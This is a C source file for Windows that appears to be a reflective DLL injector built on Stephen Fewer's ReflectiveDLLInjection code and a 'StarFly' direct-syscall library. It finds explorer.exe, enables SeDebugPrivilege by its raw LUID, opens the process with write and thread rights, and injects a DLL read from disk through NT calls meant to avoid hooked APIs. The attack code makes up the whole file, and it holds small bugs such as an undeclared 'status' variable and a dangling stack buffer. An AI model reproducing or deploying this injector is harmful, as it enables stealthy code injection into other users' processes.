// Copyright (c) 2015, Dan Staples

//===============================================================================================//
// Copyright (c) 2012, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "LoadLibraryR.h"
#include "nt.h"
#include "starfly.h"
extern void StarFlyCoreStart();

#pragma comment(lib,"Advapi32.lib")

#define MYFUNCTION_HASH		0x6654bba6 // hash of "MyFunction"

LPVOID pDllAddr = NULL;
DWORD tpid = 0;
wchar_t* DllPath;
UNICODE_STRING imageName;
UNICODE_STRING dosPath;

void GetDLLNTPath() {
    pDllAddr = 0;
    tpid = 0;
    DllPath = 0;
    ULONG returnLength;
    imageName.Buffer = NULL;
    SFNtQueryInformationProcess(GetCurrentProcess(), ProcessImageFileName, &imageName, 0, &returnLength);
    imageName.Buffer = (PWSTR)malloc(returnLength);
    imageName.MaximumLength = (USHORT)returnLength;
    imageName.Length = (USHORT)returnLength;
    SFNtQueryInformationProcess(GetCurrentProcess(), ProcessImageFileName, &imageName, returnLength, &returnLength);
    size_t len = wcslen(imageName.Buffer);
    wchar_t stackBuffer[1024];
    wcscpy_s(stackBuffer, 1024, imageName.Buffer);
    DllPath = stackBuffer;
    DllPath[len - 3] = L'd';
    DllPath[len - 2] = L'l';
    DllPath[len - 1] = L'l';
}

int main()
{
    StarFlyCoreStart();
    char* text = "StarFly";
    HANDLE hFile = NULL;
    HANDLE hModule = NULL;
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    LPVOID lpBuffer = NULL;
    DWORD dwLength = 0;
    DWORD dwBytesRead = 0;
    DWORD dwProcessId = 0;
    DWORD dwExitCode = 1;
    TOKEN_PRIVILEGES priv = { 0 };
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uniStr;
    CLIENT_ID clientId;
    do
    {
        ULONG bufferSize = 1024 * 1024;
        PVOID buffer = malloc(bufferSize);
        SFNtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
        PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
        while (1) {
            if (processInfo->UniqueProcessId != 0 && wcsstr(processInfo->ImageName.Buffer, L"explorer.exe")) {
                dwProcessId = (DWORD)processInfo->UniqueProcessId;
                break;
            }
            if (processInfo->NextEntryOffset == 0)
                break;
            processInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)processInfo + processInfo->NextEntryOffset);
        }
        free(buffer);
        GetDLLNTPath();
        RtlInitUnicodeString(&uniStr, DllPath);
        InitializeObjectAttributes(&objAttr, &uniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
        IO_STATUS_BLOCK ioStatusBlock;
        status = NtCreateFile(
            &hFile,
            FILE_GENERIC_READ,
            &objAttr,
            &ioStatusBlock,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );
        FILE_STANDARD_INFORMATION fileInfo;
        SFNtQueryInformationFile(hFile, &ioStatusBlock, &fileInfo, sizeof(fileInfo), FileStandardInformation);
        dwLength = fileInfo.EndOfFile.LowPart;
        lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
        SFNtReadFile(hFile, NULL, NULL, NULL, &ioStatusBlock, lpBuffer, dwLength, NULL, NULL);

        HANDLE hToken;
        SFNtOpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &hToken);
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid.LowPart = 0x00000014;
        tp.Privileges[0].Luid.HighPart = 0x00000000;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        SFNtAdjustPrivilegesToken(hToken, FALSE, &tp, 0, NULL, NULL);
        clientId.UniqueProcess = (HANDLE)dwProcessId;
        clientId.UniqueThread = 0;
        hProcess = 0;
        InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
        SFNtOpenProcess(&hProcess, PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, &objAttr, &clientId);
        LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL, MYFUNCTION_HASH, text, (DWORD)(strlen(text) + 1));
    } while (0);

    if (lpBuffer)
        HeapFree(GetProcessHeap(), 0, lpBuffer);
    return dwExitCode;
}